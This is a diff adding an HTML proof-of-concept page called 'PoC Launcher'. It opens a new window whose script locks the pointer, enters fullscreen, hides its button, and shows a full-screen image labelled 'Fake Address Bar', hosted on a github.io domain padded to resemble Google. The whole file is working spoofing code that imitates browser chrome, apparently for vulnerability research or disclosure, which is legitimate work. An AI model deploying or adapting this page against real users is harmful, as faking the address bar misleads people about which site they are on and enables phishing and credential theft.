@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC Launcher</title>
+</head>
+<body>
+
+  <button onclick="launch()">Launch PoC</button>
+
+  <script>
+    function launch() {
+      const win = window.open('about:blank', '_blank');
+
+      const poc = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <style>
+            body {
+              margin: 0;
+              padding: 0;
+              background-color: #000;
+              overflow: hidden;
+            }
+            #fake-ui {
+              display: none;
+              width: 100vw;
+              height: 100vh;
+              object-fit: contain;
+            }
+          </style>
+        </head>
+        <body>
+
+          <button id="btn" onclick="spoof()">Click here</button>
+          <img id="fake-ui" src="https://googlegooglegooglegooglegooglegooglegoo.github.io/chrome.jpeg" alt="Fake Address Bar">
+
+          <script>
+            function spoof() {
+              document.body.requestPointerLock();
+
+              setTimeout(() => {
+                document.body.requestFullscreen().then(() => {
+                  document.getElementById('btn').style.display = 'none';
+                  document.getElementById('fake-ui').style.display = 'block';
+                }).catch(err => {
+                  console.error(err);
+                });
+              }, 1000);
+            }
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      win.document.open();
+      win.document.write(poc);
+      win.document.close();
+    }
+  </script>
+
+</body>
+</html>
